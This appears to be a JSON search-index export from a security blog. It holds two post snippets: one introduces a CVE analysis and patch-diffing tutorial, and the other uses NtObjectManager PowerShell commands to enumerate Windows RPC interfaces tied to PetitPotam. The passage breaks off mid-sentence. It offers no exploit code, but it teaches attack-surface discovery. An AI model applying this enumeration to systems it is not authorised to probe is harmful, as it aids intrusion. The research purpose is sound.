[ { "title": "Introducing CVE North Stars", "url": "/posts/cve-north-stars/", "categories": "projects, cve-north-stars", "tags": "cve, research, patchdiff, rootcause", "date": "2022-08-30 10:48:00 +0000", "snippet": " TL;DR - CVE North Stars is a tutorial that introduces a method to kickstart vulnerability research by treating CVEs as North Stars in vulnerability discovery and comprehension.BackgroundThis post introduces CVE North Stars, a tutorial I started writing back in 2020 (v1.0.0) when attempting to learn methods of vulnerability research. At the time, I observed several examples of others using CVEs as a starting point in their research. Researchers were leveraging CVEs to both learn about the particular vulnerabilities and even discover new ones along the way. I decided to write a tutorial to teach myself how to leverage CVEs in my own research, as I really don’t understand something until I try to write about it.Standing on the Shoulders of GiantsBefore I try to make the argument that CVEs are a great place to start your research, know that this idea isn’t new. Several prominent security researchers share this sentiment. My end goal was to do variant analysis on the vulnerability, but without full and accurate details about the vulnerability, I needed to do a root cause analysis first. I tried to get my hands on the exploit sample, but I wasn’t able to source a copy. Without the exploit, I had to use binary patch diffing in order to complete root cause analysis. - TFW you-get-really-excited-you-patch-diffed-…Maddie Stone (@maddiestone) was leveraging CVEs and patch diffing back in 2020 for new discoveries. Her research inspired several of my thoughts on the value of patch diffing analysis. As of June 15, 2022, there have been 18 0-days detected and disclosed as exploited in-the-wild in 2022. When we analyzed those 0-days, we found that at least nine of the 0-days are variants of previously patched vulnerabilities. At least half of the 0-days we’ve seen in the first six months of 2022 could have been prevented with more comprehensive patching and regression tests. - 2022 0-day In-the-Wild Exploitation…so farHer research continues in 2022, reporting that researchers (for better or worse) are still using CVEs for 0-day vulnerability research. “Patches are really good documentation for when you are familiarizing yourself with the code base.”“They can give you inspiration for ideas you didn’t yet have, or patterns, or variants.”OffensiveCon22 - Mark Dowd- Keynote - How Do You Actually Find Bugs?Mark Dowd (@mdowd) is teaching the value of leveraging CVEs in 2022. He further explains that the patches show you where the bug is, but not exactly what it is. It will take some effort (analysis) on your part to gain that full understanding. From his keynote, and in my experience, it is in striving for understanding of how and why the code base was vulnerable that new insights will emerge. This same idea, promoted throughout CVE North Stars, will hopefully inspire and guide you on your next vulnerability discovery.Aside: @mdowd’s book “The Art Of Software Security Assessment” is a must have if you are getting started in vulnerability research.Tutorial OverviewAs mentioned, I wrote the tutorial as a way to learn the process and the skills involved in analyzing CVEs. Essentially, writing to learn. Here is what I came up with.From the CVE North Stars: CVE North Stars introduces a method to kickstart vulnerability research by taking advantage of the CVE information freely available (ie public blog posts, Github POCs, CVE Mitre database, etc). A CVE provides a compass of sorts that orients and guides a researcher towards a deeper understanding of the patched vulnerability and its vulnerability class. The idea is to treat CVEs as North Stars in vulnerability discovery and comprehension. CVE North Stars - OverviewCVE Analysis TemplateThe tutorial walks through (now slightly dated) practical examples of Windows Print Spooler CVEs from 2020-2021. It starts by observing each CVE through the lens of a CVE Analysis Template. The template can help orient you and keep you on track in your analysis. WHY USE A TEMPLATE? A Path to Follow - A template helps remove the guesswork of analysis. It provides a standard set of concepts and attributes to consider and helps a researcher focus the important aspects as related to the vulnerability. Efficiency through Standardization - As the process becomes familiar, the speed of analysis increases. With experience comes the ability to pick out the relevant information. With this (or another) prescribed template, the concepts to watch for are clear.CVE Analysis - Why Use A Template The Ideal ProcessThe tutorial prescribes the following ideal CVE analysis process.The basic idea is to look at CVEs, build up your knowledge of the code base and vulnerability classes, and eventually discover vulnerabilities on your own.More formally, the high level idea is to: Research relevant CVEs Perform analysis (CVE and Patch Diffing) to reach a sufficient level of understanding. Sprinkle in some root cause analysis to ensure a solid patch. Leverage the knowledge gained throughout the process to discover new or related vulnerabilities.graph TD;A1[ CVE Research] --&gt; A[CVE-2020-1048];A1 --&gt; B[CVE-2020-1337];A1 --&gt; C[CVE-2020-17001];A1 --&gt; D[CVE-2010-2729];A1 --&gt; E[CVE-2020-1030];A --&gt; F[CVE Analysis + Patch Diffing];B --&gt; F;C --&gt; F;D --&gt; F;E --&gt; F;F --&gt; I[System Comprehension]F --&gt; G[Vulnerability Classification];F --&gt; H[Root Cause Identification];G --&gt; J[Develop Mitigation Requirements / Novel Understanding];H --&gt; J;I --&gt; J;J --&gt; K[Discover New and/or Related Vulnerabilities]Starting with CVE analysis, progressing to patch diffing, and finishing up with root cause analysis, you progress from knowing about a CVE to actually understanding it. Performing analysis of a CVE challenges the researcher to go one step past learning (what others understand) and arrive in a place of actual research (discovering something new). This short tutorial walks through practical CVE analysis, binary patch diffing, and root cause analysis. While these techniques for vulnerability research aren’t new, this tutorial offers a concise collection of practical examples and ideas for leveraging CVEs to get started. CVE North Stars - OverviewstateDiagram-v2 direction LR s1: edge of current understanding [*] --&gt; s1: Learning s1 --&gt; [*]: ResearchEssentially, for any research that you do, you begin by learning. You come up to speed with what is known and try to progress. You continue learning until you take one step past learning and enter into research (discovery).Key ObjectivesThe course attempts to deliver on the following objectives: Learn a practical method to focus on a set of CVEs to discover and generalize a vulnerability class or CWE - Common Weakness Enumeration via CVE analysis. Gain familiarity with the Microsoft Windows update process Improve Reverse Engineering and use of open source tools (Ghidra, symchk, patch-diff-correlator, etc.) Experience Patch Diffing With Ghidra Introduction to Root Cause AnalysisBeyond Vulnerability ResearchEven if you aren’t interested directly in vulnerability research, you might be interested in the various RE skills presented in the tutorial: Microsoft Security Patches Ghidra Patch Diffing Root Cause AnalysisTutorial ProgressionThe original version (v1.0.0) I wrote in markdown, which is a pretty good way for sharing information, but not as flexible as I wanted.Github Markdown Version v1.0.0I recently published a new version (v2.0.0) using an excellent documentation Jekyll theme called Just The Docs. Just-The-Docs allows for a responsive and searchable documentation that renders well on both desktop and mobile (see Just The Docs documentation if interested).v2.0.0 available at https://cve-north-stars.github.io/Try ItIf you are getting started in vulnerability research, or just need some direction, consider using a CVE as your North Star for your next vulnerability research project.Please reach out @clearbluejar with questions or comments. Also appreciate any feedback or corrections you might have for the post.Cover Photo by Faik Akmd from Pexels" }, { "title": "From NtObjectManager to PetitPotam", "url": "/posts/from-ntobjectmanager-to-petitpotam/", "categories": "windows, rpc", "tags": "ntobjectmanager, rpcview, NTLMrelay, petitpotam, C#, rpc, ghidra", "date": "2022-06-24 03:46:00 +0000", "snippet": "TL;DR - Windows RPC enumeration, discovery, and auditing via NtObjectManager. We will audit the vulnerable RPC interfaces that lead to PetitPotam, discover how they have changed over the past year, and overcome some common RPC auditing pitfalls.I was inspired by From RpcView to PetitPotam from @itm4n, an excellent post that taught me how to use RpcView to discover the RPC interfaces and in particular the one that enabled PetitPotam by @topotam77. In the post, itm4n progresses from RPC interface discovery to teaching us how to build a RPC client to flex the vulnerable interface. This post is a spinoff of that same topic, this time leveraging James Forshaw’s (@tiraniddo) NtObjectManager. It was also a perfect opportunity to learn how to use NtObjectManager for RPC research and auditing using a well known example.Itm4n walks through complex topics for Windows RPC with seeming ease. Covering the high level aspects and offering clarity for nuanced RPC concepts such as binding handles with clear pictures. A topic in which MSDN quickly lost me. More to the point of this post, he explains how to leverage RpcView to: discover interesting interfaces, procedures, and endpoints decomplile a RPC EFS interface related to PetitPotam help build a RPC client in Visual Studio to exercise the EFS interfaceAt the end of the post, Itm4n alludes to other ways of doing what he did and even references the toolset I’m about to walk through. Finally, implementing an RPC client in C/C++ isn’t necessarily the best approach if you are doing some security oriented research as this process is rather time-consuming. However, I would still recommend it because it is a good way to learn and have a better understanding of some Windows internals. As an alternative, a more research oriented approach would consist in using the NtObjectManager module developed by James Forshaw. This module is quite powerful as it allows you to interact with an RPC server in a few lines of PowerShell. As usual, James wrote an excellent article about it here: Calling Local Windows RPC Servers from .NET.From RpcView to PetitPotamNow we are going to try and walk through the alternative approach using NtObjectManager. Perhaps, by the end we can discover together some pros and cons of each toolset.NtObjectManager and RPCThe NtObjectManager PowerShell module (backed by its supporting .NET managed library NtApiDotNet) is a godsend for Windows security researchers. From dealing with symbolic links, auditing RPC servers, playing tricks with the Object Manager, to just messing about with Windows, it has a myriad of applications. As one trying to improve their own auditing skills and understanding Windows internals, I am grateful for it. Right now I’ll admit that I am just touching the surface of the capability of the toolset. There are some advanced use cases that I have yet to get my head around. This post will be a step in the right direction. Before we jump into how to use NtObjectManager for RPC auditing, let’s take a short walk through the history of the RPC capabilities within NtApiDotNet.Forshaw put together NtObjectManager and his sandbox attack surface analysis tool kit for expediting his own research and the benefit of others. He is known to develop tools where he can’t find any other solutions in support of his security research. As much as I enjoy finding security vulnerabilities in Windows, in many ways I prefer the challenge of writing the tools to make it easier for me and others to do the hunting. Calling Local Windows RPC Servers from .NETThe RPC capabilities within NtApiDotNet have been there for sometime with their formal introduction being the “Reimplementing Local RPC in .NET” talk. Here I am in 2022, finally getting around to playing with the toolset.RPC HistoryEssentially this is a list of RPC references for NtObjectManager.cat README.txt | grep -i -e \"rpc\" -e \"ndr\" v1.1.12 Added basic NDR parser. v1.1.16 Added support for extracting RPC servers from a DLL. Added support for enumerating registered RPC endpoints with Get-RpcEndpoint. Added support for enumerating running service information with Get-RunningService. v1.1.17 Added option to parse out RPC clients in Get-RpcServer Added Get-RpcAlpcServer cmdlet v1.1.21 Added basic RPC ALPC client support v1.1.23 Added Compare-RpcServer. Added option to Format-RpcClient to output to a directory. Added Select-RpcServer cmdlet. Added RPC ALPC port brute force. v1.1.28 Added C# compiler support for .NET Core Support of Get-RpcClient. v1.1.30 Added basic named pipe support for RPC clients. v1.1.31 Added TCP/IP RPC transport and add signing/encryption. Added Disconnect-RpcClient. Added server information for local RPC connection v1.1.33 Added RPC pipe support. Doing a bit more digging, it seems RPC functionality appeared within NtApiDotNet in 2018. The first evidence I can see of an NDR parser in NtApiDotNet from release tag v1.1.12. By July 2018, the ability to parse RPC servers was there and in November of 2018, NtObjectManager Forshaw put out a post demonstrating the ability to parse RPC servers and clients. At this point, NtApiDotNet was yet to have a RPC client generator, which seemed to arrive mid 2019 in NtObjectManger v1.1.21 . The RPC C# client generator, as we will use later instead of a Visual Studio C++ and MIDL compiler, can greatly reduce the time needed to create an RPC client. In 2019, Forshaw posted a tutorial that walks us through the primary use cases for NtObjectManger in survey of the RPC landscape. That article will also be our starting point using NtObjectManager to rediscover PetitPotam a bit later.Implementation The implementation I developed is all available in the Sandbox Analysis Tools Github repository. The implementation contains classes to load DLLs/EXEs and extract RPC server information to a .NET object. It also contains classes to marshal data using the Network Data Representation (NDR) protocol as well as the Local RPC client code. Finally I implemented a client generator which takes in the parsed RPC server information and generates a C# source code file. Calling Local Windows RPC Servers from .NETThe primary capabilities of the toolset are ideal for diving into RPC. The high level features I have seen are: RPC Server (and client) enumeration and discovery RPC Client generation RPC Server DiffingNtObjectManager for RPC AuditingLast time in A Survey of Windows RPC Discovery Tools, we obtained a detailed understanding of how some of these RPC enumeration tools work under the hood. This post will be more practical. In this section we recreate the RPC auditing from RPCView to Petitpotam by leveraging Forshaw’s NtObjectManager.Before we get going, make sure you setup your DbgHelp DLL path before we get started.PS C:\\Users\\user&gt; Set-GlobalSymbolResolver -DbgHelpPath 'C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x64\\dbghelp.dll' Use NtObjectManager to Discover interesting Interfaces, Endpoints, ProceduresAs mentioned above and detailed by itm4n, RpcView provides a nice GUI and a workflow which you can pivot from a running process to the RPC interfaces and endpoints found within that process. I detailed in which contexts I might use each tool, but after writing this post I feel like NtObjectManager is the front runner for general RPC auditing.RpcView GUIBy the time you see the GUI, and again on a set interval, RpcView automatically discovers the running processes that contain RPC servers. As we have learned, NtObjectManager in contrast, does not have a GUI and also does not analyze processes at runtime. Rather, the first step to RPC server discovery is to feed a list of files to be parsed by Get-RpcServer in NtObjectManager. Each file path piped into Get-RpcServer will be loaded in memory, parsed and have each image section checked for the aforementioned RPC data structures.# Find all servers in SYSTEM32. PS C:\\Users\\user&gt; $allrpc = ls \"C:\\Windows\\system32\\*\" -Include \"*.dll\",\"*.exe\" ` | Get-RpcServerIt will take about a minute or so to chug through all the binaries in System32…PS C:\\Users\\user&gt; Measure-Command {$allrpc = ls \"C:\\Windows\\system32\\*\" -Include \"*.dll\",\"*.exe\" | Get-RpcServer }Days : 0Hours : 0Minutes : 0Seconds : 59Milliseconds : 262Ticks : 592628678TotalDays : 0.000685912821759259TotalHours : 0.0164619077222222TotalMinutes : 0.987714463333333TotalSeconds : 59.2628678TotalMilliseconds : 59262.8678NtObjectManager in actionNtObjectManager found 456 RPC Servers (or interfaces) on my Windows 11 machine:PS C:\\Users\\user&gt; $allrpc | Measure-Object -LineLines Words Characters Property----- ----- ---------- -------- 456The result of parsing all the interfaces from the RPC servers from the binaries (and there often multiple interfaces within one binary) will look something like this:PS C:\\Users\\user&gt; $allrpc | moreName UUID Ver Procs EPs Service Running---- ---- --- ----- --- ------- -------ACPBackgroundManagerPolicy.dll fc48cd89-98d6-4628-9839-86f7a3e4161a 1.0 9 10 Falseadhsvc.dll c49a5a70-8a7f-4e70-ba16-1e8f1f193ef1 1.0 7 4 FalseAggregatorHost.exe 7df1ceae-de4e-4e6f-ab14-49636e7c2052 1.0 2 1 FalseAPHostService.dll d2716e94-25cb-4820-bc15-537866578562 1.0 8 1 OneSyncSvc Falseappidsvc.dll 8a7b5006-cc13-11db-9705-005056c00008 1.0 4 0 AppIDSvc Falseappinfo.dll 0497b57d-2e66-424f-a0c6-157cd5d41700 1.0 9 1 Appinfo Trueappinfo.dll 58e604e8-9adb-4d2e-a464-3b0683fb1480 1.0 1 1 Appinfo Trueappinfo.dll fd7a0523-dc70-43dd-9b2e-9c5ed48225b1 1.0 1 1 Appinfo Trueappinfo.dll 5f54ce7d-5b79-4175-8584-cb65313a0e98 1.0 1 1 Appinfo Trueappinfo.dll 201ef99a-7fa0-444c-9399-19ba84f12a1a 1.0 7 1 Appinfo Trueappinfo.dll 0f738e20-73c0-4ca8-aa6a-8dfef545fea8 1.0 1 1 Appinfo Trueappmgmts.dll 8c7daf44-b6dc-11d1-9a4c-0020af6e7c57 1.0 9 0 AppMgmt FalseAppVEntSubsystemController.dll 8c7fbdb0-8513-44f9-a8b1-1a3b49322bf4 1.0 1 0 FalseAppVEntSubsystemController.dll 4b183cf6-affd-4872-9da2-7564b683d027 1.0 6 0 FalseAppVEntSubsystemController.dll 71d6addc-3548-4d49-8580-589694df3c9d 1.0 2 0 FalseAppVEntSubsystemController.dll 8d17061c-534a-4f1b-bd77-f615421cf379 1.0 4 0 FalseAppVEntSubsystemController.dll 6d809348-7e6c-41b9-91bc-630fe5503d66 1.0 1 0 FalseAppVEntSubsystemController.dll 44e10347-37a0-494c-871c-fb90f7145742 1.0 10 0 FalseAppVEntSubsystemController.dll edce686d-acae-4a2a-8945-24489443c35e 1.0 1 0 FalseAppVEntSubsystemController.dll af1e812f-2d47-4c99-9b36-15984de66d89 1.0 2 0 FalseAppVEntSubsystemController.dll 461e6f82-89d8-4b7b-95ca-2e5c965953fc 1.0 22 0 FalseAppVEntSubsystemController.dll 66055171-882c-4625-8fd7-cc7c30e2b226 1.0 1 0 FalseAppVEntSubsystems64.dll 8a92a787-eba6-4d09-ba84-0a8cb293bc30 1.0 1 0 FalseAppVShNotify.exe a80a054e-95a5-46b2-9b3b-afdb29f247fb 1.0 1 0 FalseAppVShNotify.exe 7f89f606-468e-4ee4-b1f3-73b68767b0e1 1.0 1 0 FalseAppVShNotify.exe 6bbd4016-73b6-4fac-81c4-f2256dcee12d 1.0 1 0 FalseAppXDeploymentServer.dll ae2dc901-312d-41df-8b79-e835e63db874 1.0 79 1 AppXSvc TrueAppXDeploymentServer.dll ff9fd3c4-742e-45e0-91dd-2f5bc632a1df 1.0 3 1 AppXSvc Trueaudiodg.exe bc6d982b-e799-48b2-a732-4ac111923bc6 1.0 8 0 Falseaudiosrv.dll 99b833a0-e768-4a17-b117-0e32fa4b6bb9 2.8 169 0 Audiosrv Trueaudiosrv.dll c7ce3826-891f-4376-b161-c63d2403142c 1.0 1 0 Audiosrv Trueaudiosrv.dll cba4c918-e55a-46ee-aa62-cade158e9165 1.0 1 0 Audiosrv Trueaudiosrv.dll 910562c3-ebd9-46b9-baba-1d45842a0ceb 1.0 12 0 Audiosrv Trueaudiosrv.dll 2b29a846-9ad7-49b6-bc52-b019c5c0c56f 1.6 55 0 Audiosrv Trueauthz.dll 0b1c2170-5732-4e0e-8cd3-d9b16f3b84d7 0.0 7 0 Falsebdesvc.dll ae55c4c0-64ce-11dd-ad8b-0800200c9a66 1.0 13 1 BDESVC TrueBFE.DLL dd490425-5325-4565-b774-7e27d6c09c24 1.0 194 1 BFE True# several lines ommited$allrpc now contains a collection of NtApiDotNet.Win32.RpcServer objects that may or may not also include clients.PS C:\\Users\\user&gt; $rpc[0] | Get-Member TypeName: NtApiDotNet.Win32.RpcServerName MemberType Definition---- ---------- ----------Equals Method bool Equals(System.Object obj)FormatAsText Method string FormatAsText(), string FormatAsText(bool remove_comments), string FormatAsText(bool remove_comments, bool cpp_format)GetHashCode Method int GetHashCode()GetType Method type GetType()ResolveRunningEndpoint Method string ResolveRunningEndpoint()Serialize Method void Serialize(System.IO.Stream stm), byte[] Serialize()ToString Method string ToString()Client Property bool Client {get;}ComplexTypes Property System.Collections.Generic.IEnumerable[NtApiDotNet.Ndr.NdrComplexTypeReference] ComplexTypes {get;}InterfacesIf you know the specific interface that you are looking for, it is quite easy to find using NtObjectManager. For PetitPotam the EFSRPC interface was c681d488-d850-11d0-8c52-00c04fd90f7e. To discover that the following command would work.PS C:\\Users\\user&gt; $allrpc | Select-RpcServer -InterfaceId 'c681d488-d850-11d0-8c52-00c04fd90f7e'Name UUID Ver Procs EPs Service Running---- ---- --- ----- --- ------- -------efslsaext.dll c681d488-d850-11d0-8c52-00c04fd90f7e 1.0 21 0 FalseFor detailed information:PS C:\\Users\\user&gt; $allrpc | Select-RpcServer -InterfaceId 'c681d488-d850-11d0-8c52-00c04fd90f7e' | flInterfaceId : c681d488-d850-11d0-8c52-00c04fd90f7eInterfaceVersion : 1.0TransferSyntaxId : 8a885d04-1ceb-11c9-9fe8-08002b104860TransferSyntaxVersion : 2.0ProcedureCount : 21Procedures : {EfsRpcOpenFileRaw_Downlevel, EfsRpcReadFileRaw_Downlevel, EfsRpcWriteFileRaw_Downlevel, EfsRpcCloseRaw_Downlevel...}Server : UUID: c681d488-d850-11d0-8c52-00c04fd90f7eComplexTypes : {Struct_0, Struct_1, Struct_2, Struct_3...}FilePath : C:\\Windows\\system32\\efslsaext.dllName : efslsaext.dllOffset : 71808ServiceName :ServiceDisplayName :IsServiceRunning : FalseEndpoints : {}EndpointCount : 0Client : FalseTo discover other interesting interfaces, like the MS-PAR protocol “nightmare” interface (76F03F96-CDFD-44FC-A22C-64950A001209), try this command (using a slight variation Where-Object showing that the RpcServer objects play nice with standard PS commands):PS C:\\Users\\user&gt; $allrpc | Where-Object InterfaceId -eq '76F03F96-CDFD-44FC-A22C-64950A001209' | flInterfaceId : 76f03f96-cdfd-44fc-a22c-64950a001209InterfaceVersion : 1.0TransferSyntaxId : 8a885d04-1ceb-11c9-9fe8-08002b104860TransferSyntaxVersion : 2.0ProcedureCount : 81Procedures : {RpcAsyncOpenPrinter, RpcAsyncAddPrinter, RpcAsyncSetJob, RpcAsyncGetJob...}Server : UUID: 76f03f96-cdfd-44fc-a22c-64950a001209ComplexTypes : {Struct_0, Struct_1, Union_2, Struct_3...}FilePath : C:\\Windows\\system32\\spoolsv.exeName : spoolsv.exeOffset : 538032ServiceName : SpoolerServiceDisplayName : Print SpoolerIsServiceRunning : TrueEndpoints : {[76f03f96-cdfd-44fc-a22c-64950a001209, 1.0] ncacn_ip_tcp:[49669], [76f03f96-cdfd-44fc-a22c-64950a001209, 1.0] ncalrpc:[LRPC-6406b1545800cf205a]}EndpointCount : 2Client : FalseEndpointsFor endpoints searching, you might know a well-known endpoint or perhaps a specific protocol sequence for your RPC server, and you can query to see which RPC server has that endpoint.Query your parsed servers that contain endpoints for named pipe endpoints:PS C:\\Users\\user&gt; $allrpc | ? { $_.Endpoints } | ForEach-Object {$_.Endpoints} | Select-String ncacn_np[df1941c5-fe89-4e79-bf10-463657acf44d, 1.0] ncacn_np:[\\\\pipe\\\\efsrpc][04eeb297-cbf4-466b-8a2a-bfd6a2f10bba, 1.0] ncacn_np:[\\\\pipe\\\\efsrpc][51a227ae-825b-41f2-b4a9-1ac9557a1018, 1.0] ncacn_np:[\\\\pipe\\\\lsass][8fb74744-b2ff-4c00-be0d-9ef9a191fe1b, 1.0] ncacn_np:[\\\\pipe\\\\lsass][b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86, 2.0] ncacn_np:[\\\\pipe\\\\lsass][650a7e26-eab8-5533-ce43-9c1dfce11511, 1.0] ncacn_np:[\\\\PIPE\\\\ROUTER][12345778-1234-abcd-ef00-0123456789ac, 1.0] ncacn_np:[\\\\pipe\\\\lsass][3a9ef155-691d-4449-8d05-09ad57031823, 1.0] ncacn_np:[\\\\PIPE\\\\atsvc][86d35949-83c9-4044-b424-db363231fd0c, 1.0] ncacn_np:[\\\\PIPE\\\\atsvc][29770a8f-829b-4158-90a2-78cd488501f7, 1.0] ncacn_np:[\\\\pipe\\\\SessEnvPublicRpc][1ff70682-0a51-30e8-076d-740be8cee98b, 1.0] ncacn_np:[\\\\PIPE\\\\atsvc][378e52b0-c0a9-11cf-822d-00aa0051e40f, 1.0] ncacn_np:[\\\\PIPE\\\\atsvc][f6beaff7-1e19-4fbb-9f8f-b89e2018337c, 1.0] ncacn_np:[\\\\pipe\\\\eventlog][d95afe70-a6d5-4259-822e-2c84da1ddb0d, 1.0] ncacn_np:[\\\\PIPE\\\\InitShutdown][76f226c3-ec14-4325-8a99-6a46348418af, 1.0] ncacn_np:[\\\\PIPE\\\\InitShutdown][76f226c3-ec14-4325-8a99-6a46348418af, 1.0] ncacn_np:[\\\\PIPE\\\\InitShutdown][7f1343fe-50a9-4927-a778-0c5859517bac, 1.0] ncacn_np:[\\\\PIPE\\\\wkssvc][33d84484-3626-47ee-8c6f-e7e98b113be1, 2.0] ncacn_np:[\\\\PIPE\\\\atsvc]You don’t have to rely on the RPC servers you have already parsed to get a list of endpoints. The RPC Endpoint Mapper is running. Use the following command to query it.PS C:\\Users\\user&gt; get-help Get-RpcEndpoint -examplesNAME Get-RpcEndpointSYNOPSIS Gets the endpoints for a RPC interface from the local endpoint mapper or by brute force.These are the endpoints reported by the endpoint mapper on my Windows 11 machine.PS C:\\Users\\user&gt; Get-RpcEndpoint | Select-String ncacn_np[650a7e26-eab8-5533-ce43-9c1dfce11511, 1.0] ncacn_np:[\\\\PIPE\\\\ROUTER][2f5f6521-cb55-1059-b446-00df0bce31db, 1.0] ncacn_np:[\\\\pipe\\\\tapsrv][29770a8f-829b-4158-90a2-78cd488501f7, 1.0] ncacn_np:[\\\\pipe\\\\SessEnvPublicRpc][7f1343fe-50a9-4927-a778-0c5859517bac, 1.0] ncacn_np:[\\\\PIPE\\\\wkssvc][f6beaff7-1e19-4fbb-9f8f-b89e2018337c, 1.0] ncacn_np:[\\\\pipe\\\\eventlog][1ff70682-0a51-30e8-076d-740be8cee98b, 1.0] ncacn_np:[\\\\PIPE\\\\atsvc][378e52b0-c0a9-11cf-822d-00aa0051e40f, 1.0] ncacn_np:[\\\\PIPE\\\\atsvc][33d84484-3626-47ee-8c6f-e7e98b113be1, 2.0] ncacn_np:[\\\\PIPE\\\\atsvc][86d35949-83c9-4044-b424-db363231fd0c, 1.0] ncacn_np:[\\\\PIPE\\\\atsvc][3a9ef155-691d-4449-8d05-09ad57031823, 1.0] ncacn_np:[\\\\PIPE\\\\atsvc][76f226c3-ec14-4325-8a99-6a46348418af, 1.0] ncacn_np:[\\\\PIPE\\\\InitShutdown][d95afe70-a6d5-4259-822e-2c84da1ddb0d, 1.0] ncacn_np:[\\\\PIPE\\\\InitShutdown][12345778-1234-abcd-ef00-0123456789ac, 1.0] ncacn_np:[\\\\pipe\\\\lsass][b25a52bf-e5dd-4f4a-aea6-8ca7272a0e86, 2.0] ncacn_np:[\\\\pipe\\\\lsass][8fb74744-b2ff-4c00-be0d-9ef9a191fe1b, 1.0] ncacn_np:[\\\\pipe\\\\lsass][51a227ae-825b-41f2-b4a9-1ac9557a1018, 1.0] ncacn_np:[\\\\pipe\\\\lsass]Fewer endpoints reported in the dynamic query because NtObjectManager will find the RPC servers whether or not they are running or advertised in the mapper.ProceduresSometimes when we are looking for interesting procedures, an interesting keyword is all that we need. Perhaps the term “connect” or “set” or even “file” can be enough to discover interesting procedures. Itm4n qualifies an interesting procedure in the article as one with the word “file” in the procedure name. File operations initiated by low-privileged users and performed by privileged processes (such as services running as SYSTEM) are always interesting to investigate because they might lead to local privilege escalation (or even remote code execution in some cases). On top of that, they are relatively easy to find and visualize, using Process Monitor for instance. From RpcView to PetitPotamFor RpcView the discovery of procedure names is a tedious, even if you know what you a looking for. You have to click each interface to see the list of procedures. When clicking on the LSASS process (1), we can see that it contains many RPC interfaces. So we go through them one by one and we stop on the one with the GUID c681d488-d850-11d0-8c52-00c04fd90f7e (2) because it exposes several procedures that seem to perform file operations (according to their name) (3). From RpcView to PetitPotamIt can filter, just not by procedure name.RpcView FiltersHere is where NtObjectManager shines. If you want to find interesting procedure names you can use the provided cmdlet Select-RpcServer.PS C:\\Users\\user&gt; Get-Help Select-RpcServer -ExamplesNAME Select-RpcServerSYNOPSIS Selects RPC server objects based on some specific criteria. ---------- EXAMPLE 1 ---------- $rpc | Select-RpcServer -Name \"Start\" Select all servers which have a procedure containing the text Start. ---------- EXAMPLE 2 ---------- $rpc | Select-RpcServer -SystemHandle Select all servers which have a procedure which take a system handle parameter. ---------- EXAMPLE 3 ---------- $rpc | Select-RpcServer -SystemHandle -SystemHandleType File Select all servers which have a procedure which take a system handle parameter of type File.To find RPC servers with procedure names that include the keyword ‘file’:PS C:\\Users\\user&gt; $allrpc | Select-RpcServer -Name 'file'Name UUID Ver Procs EPs Service Running---- ---- --- ----- --- ------- -------AggregatorHost.exe 7df1ceae-de4e-4e6f-ab14-49636e7c2052 1.0 2 1 Falseappidsvc.dll 8a7b5006-cc13-11db-9705-005056c00008 1.0 4 0 AppIDSvc Falseappinfo.dll 0497b57d-2e66-424f-a0c6-157cd5d41700 1.0 9 1 Appinfo TrueAppVEntSubsystemController.dll af1e812f-2d47-4c99-9b36-15984de66d89 1.0 2 0 Falseaudiosrv.dll 2b29a846-9ad7-49b6-bc52-b019c5c0c56f 1.6 55 0 Audiosrv TrueBFE.DLL dd490425-5325-4565-b774-7e27d6c09c24 1.0 194 1 BFE TrueCmService.dll f1c37891-201f-4aa3-94b1-a5d131b04920 1.0 46 1 CmService TrueDispBroker.Desktop.dll 509bc7ae-77be-4ee8-b07c-0d096bb44345 1.0 10 2 DispBrokerDesktopSvc Truedot3svc.dll 1bddb2a6-c0c3-41be-8703-ddbdf4f0e80a 1.0 21 0 dot3svc Falsedssvc.dll bf4dc912-e52f-4904-8ebe-9317c1bdd497 1.0 8 2 DsSvc Truedusmsvc.dll c27f3c08-92ba-478c-b446-b419c4cef0e2 1.0 26 1 DusmSvc Trueedgehtml.dll 9ccb59aa-1358-4169-aebb-ed83357d6304 1.0 173 0 Falseefslsaext.dll c681d488-d850-11d0-8c52-00c04fd90f7e 1.0 21 0 Falseefssvc.dll df1941c5-fe89-4e79-bf10-463657acf44d 1.0 53 2 EFS Falseefssvc.dll 04eeb297-cbf4-466b-8a2a-bfd6a2f10bba 1.0 7 2 EFS FalseFXSSVC.exe ea0a3165-4834-11d2-a6f8-00c04fa346cc 4.0 105 0 Fax Falselpasvc.dll 4f4fa786-2f8f-49e8-8aae-6669febd5d1d 1.0 24 0 wlpasvc Falselsasrv.dll 12345778-1234-abcd-ef00-0123456789ab 0.0 134 0 Falsenetprofmsvc.dll bd6ca954-842e-468f-8b07-89cbfa9522dc 1.0 1 2 netprofm Truepcasvc.dll 0767a036-0d22-48aa-ba69-b619480f38cb 1.0 8 1 PcaSvc TruePimIndexMaintenance.dll 43890c94-bfd7-4655-ad6a-b4a68397cdcb 0.0 14 0 PimIndexMaintenanceSvc Falseprofsvc.dll 326731e3-c1c0-4a69-ae20-7d9044a4ea5c 1.0 8 0 ProfSvc Truerascustom.dll 650a7e26-eab8-5533-ce43-9c1dfce11511 1.0 40 4 Falsescesrv.dll 93149ca2-973b-11d1-8c39-00c04fb984f9 0.0 34 0 FalseSessEnv.dll b12fd546-c875-4b41-97d8-950487662202 1.0 9 0 SessionEnv Truespoolsv.exe 12345678-1234-abcd-ef00-0123456789ab 1.0 125 2 Spooler True#several lines omitted...After reviewing that output, you might select one of the interfaces and find out which specific procedure names match:PS C:\\Users\\user&gt; $allrpc | ? { $_.InterfaceId -eq 'c681d488-d850-11d0-8c52-00c04fd90f7e' } | ForEach-Object {$_.Procedures} | Out-String -Stream | Select-String fileName : EfsRpcOpenFileRaw_DownlevelName : EfsRpcReadFileRaw_DownlevelName : EfsRpcWriteFileRaw_DownlevelName : EfsRpcEncryptFileSrv_DownlevelName : EfsRpcDecryptFileSrv_DownlevelName : EfsRpcQueryUsersOnFile_DownlevelName : EfsRpcRemoveUsersFromFile_DownlevelName : EfsRpcAddUsersToFile_DownlevelName : EfsRpcSetFileEncryptionKey_DownlevelName : EfsRpcFileKeyInfo_DownlevelName : EfsRpcDuplicateEncryptionInfoFile_DownlevelName : EfsUsePinForEncryptedFiles_DownlevelName : EfsRpcAddUsersToFileEx_DownlevelName : EfsRpcFileKeyInfoEx_DownlevelName : EfsRpcGetEncryptedFileMetadata_DownlevelName : EfsRpcSetEncryptedFileMetadata_DownlevelBonus - Procedure ParametersYou can even see what types of RpcServers accept specific types of parameters for their procedures:Tab complete to see the options for types:PS C:\\Users\\user&gt; $allrpc | Select-RpcServer -SystemHandle -SystemHandleTypeComposition Event File Job Mutex Pipe Process RegKey Section Semaphore Socket Thread TokenThe query to find the interfaces that 